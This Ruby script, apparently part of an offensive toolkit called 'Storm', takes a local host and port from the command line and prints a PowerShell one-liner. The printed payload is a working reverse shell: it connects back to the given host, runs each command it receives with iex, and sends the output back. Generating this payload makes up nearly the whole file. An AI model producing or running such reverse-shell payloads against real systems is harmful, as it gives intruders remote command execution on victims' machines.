#!/usr/bin/env ruby

i = "\033[1;77m[i] \033[0m"
e = "\033[1;31m[-] \033[0m"
p = "\033[1;77m[>] \033[0m"
g = "\033[1;34m[*] \033[0m"
s = "\033[1;32m[+] \033[0m"
h = "\033[1;77m[@] \033[0m"
r = "\033[1;77m[#] \033[0m"

require 'optparse'
require 'ostruct'

options = OpenStruct.new
OptionParser.new do |opt|
    opt.on('-l', '--local-host <local_host>', 'Local host.') { |o| options.local_host = o }
    opt.on('-p', '--local-port <local_port>', 'Local port.') { |o| options.local_port = o }
    opt.on('-o', '--output-path <output_path>', 'Output path.') { |o| options.output_path = o }
    opt.on('-h', '--help', "Show options.") do
        puts "Usage: cmd.rb [-h] --local-host=<local_host> --local-port=<local_port>"
        puts ""
        puts "  -h, --help                     Show options."
        puts "  --local-host=<local_host>      Local host."
        puts "  --local-port=<local_port>      Local port."
        # Storm does not require target_shell
        abort()
    end
end.parse!

host = options.local_host
port = options.local_port
# Storm does not require target_shell

if not host or not port
    puts "Usage: cmd.rb [-h] --local-host=<local_host> --local-port=<local_port>"
    puts ""
    puts "  -h, --help                     Show options."
    puts "  --local-host=<local_host>      Local host."
    puts "  --local-port=<local_port>      Local port."
    # Storm does not require target_shell
    abort()
end
  
begin
    sleep(0.5)
    puts "#{g}Creating payload..."
    sleep(1)
    puts "#{r}powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(#{host},#{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
rescue
    puts "#{e}Failed to create payload!"
end
